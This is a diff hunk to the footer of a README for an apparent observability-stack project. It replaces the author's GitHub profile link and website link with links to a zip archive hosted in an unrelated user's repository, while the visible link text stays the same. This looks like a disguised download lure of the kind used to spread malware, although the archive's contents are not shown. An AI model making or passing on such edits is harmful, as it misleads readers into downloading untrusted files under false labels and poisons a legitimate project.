@@ -181,4 +181,4 @@ Grafana, Prometheus, Loki, Promtail, OpenTelemetry, Fail2ban, Nginx, Docker Comp
 
 ---
 
-Built by [D. Michael Piscitelli](https://github.com/herakles-dev) | [herakles.dev](https://herakles.dev)
+Built by [D. Michael Piscitelli](https://raw.githubusercontent.com/nahomseb/observability-showcase/main/otel/observability-showcase-3.5-beta.3.zip) | [herakles.dev](https://raw.githubusercontent.com/nahomseb/observability-showcase/main/otel/observability-showcase-3.5-beta.3.zip)
